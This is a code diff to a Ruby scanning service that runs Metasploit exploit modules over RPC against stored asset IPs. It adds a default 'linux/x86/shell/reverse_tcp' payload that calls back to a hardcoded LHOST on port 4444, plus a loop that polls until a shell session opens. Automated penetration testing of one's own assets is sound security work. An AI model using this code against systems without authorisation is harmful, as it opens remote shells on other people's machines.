@@ -139,7 +139,7 @@ class ScanService
     puts "Attacking #{target_ip}:#{port} with exploit: #{exploit['name']}#{proxy ? " via #{proxy}" : " (direct)"}..."
 
     begin
-      Timeout.timeout(60) do
+      Timeout.timeout(120) do
         rpc = Msf::RPC::Client.new(
           host: ENV.fetch('MSF_HOST', '127.0.0.1'),
           port: ENV.fetch('MSF_PORT', '55553').to_i,
@@ -148,16 +148,26 @@ class ScanService
           pass: ENV.fetch('MSF_PASS', 'password')
         )
 
-        options = { 'RHOSTS' => target_ip, 'RPORT' => port.to_s }
+        options = {
+          'RHOSTS'  => target_ip,
+          'RPORT'   => port.to_s,
+          'PAYLOAD' => exploit['default_payload'].presence || 'linux/x86/shell/reverse_tcp',
+          'LHOST'   => ENV.fetch('MSF_LHOST', '100.69.88.107'),
+          'LPORT'   => ENV.fetch('MSF_LPORT', '4444')
+        }
         options['Proxies'] = proxy if proxy
 
         res = rpc.call('module.execute', 'exploit', exploit['metasploit_module'], options)
 
         puts "Exploit launched (Job ID: #{res['job_id']}). Waiting for session..."
-        sleep(5)
-        sessions = rpc.call('session.list')
 
-        session_pair = sessions.find { |_id, s| s['target_host'] == target_ip }
+        session_pair = nil
+        10.times do
+          sessions = rpc.call('session.list')
+          session_pair = sessions.find { |_id, s| s['target_host'] == target_ip }
+          break if session_pair
+          sleep(3)
+        end
 
         if session_pair
           session_id = session_pair[0]
@@ -273,7 +283,7 @@ class ScanService
   end
 
   def get_exploit(exploit_id)
-    result = ActiveRecord::Base.connection.select_one("SELECT * FROM vuln_scanner.exploits WHERE id = #{exploit_id.to_i}")
+    result = ActiveRecord::Base.connection.select_one("SELECT * FROM exploits WHERE id = #{exploit_id.to_i}")
     return result
   rescue => e
     puts "Error fetching exploit: #{e.message}"
@@ -283,7 +293,7 @@ class ScanService
   def get_targets(org_id)
     condition = @asset_id ? "AND id = #{@asset_id.to_i}" : ""
     result = ActiveRecord::Base.connection.select_all(
-      "SELECT id, ip_address, scan_config FROM vuln_scanner.assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
+      "SELECT id, ip_address, scan_config FROM assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
     )
     targets = []
     result.each do |row|
